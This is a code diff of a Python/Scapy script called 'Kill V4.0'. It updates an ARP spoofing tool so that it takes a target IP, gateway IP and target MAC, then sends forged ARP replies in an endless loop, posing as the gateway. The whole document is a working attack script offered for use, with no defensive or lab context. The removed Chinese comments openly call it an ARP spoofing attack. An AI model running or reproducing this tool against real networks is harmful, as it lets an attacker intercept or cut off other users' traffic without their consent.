@@ -1,22 +1,38 @@
 import sys
 from scapy.all import ARP, Ether, sendp
 
-# 获取目标IP和网关IP地址
-target_ip = input("Please enter the destination IP address: ")
-gateway_ip = input("Please enter the gateway IP address: ")
+######################
+#Kill V4.0
+######################
+#################
+#By xiaozhao45
+#################
 
-# 构造ARP请求包并发送到目标IP和网关IP
-packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
+
+
+# Obtain target IP and gateway IP addresses 
+target_ip = input("Please enter the destination IP address: ")
+gateway_ip = input("Please enter the gateway IP addre,Do not add/24 : ")
+target_mac = input("Please enter the destination MAC address: ")
+if not target_ip or not gateway_ip:
+    print("Some information is empty!")
+    target_ip = input("Please enter the destination IP address: ")
+    gateway_ip = input("Please enter the gateway IP addres: ")
+    target_mac = input("Please enter the destination MAC address: ")
+
+
+# Construct ARP request packets and send them to the target IP and gateway IP  
+packet = Ether(dst=target_mac) / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
 sendp(packet)
 
-# 持续进行ARP欺骗攻击
+# Fire
 while True:
     try:
-        # 发送伪造的ARP响应包给目标IP和网关IP，告诉他们自己就是对方
-        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
+        
+        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
         sendp(packet)
-        print(f"An ARP spoofing attack has been sent to {target_ip} and {gateway_ip}")
+        print(f"ARP attack sent to {target_ip}")
     except KeyboardInterrupt:
         # 如果用户按下Ctrl-C，则退出程序
-        print("The user interrupts the program")
+        print("User Interrupt Program,Cease fire")
         sys.exit(0)
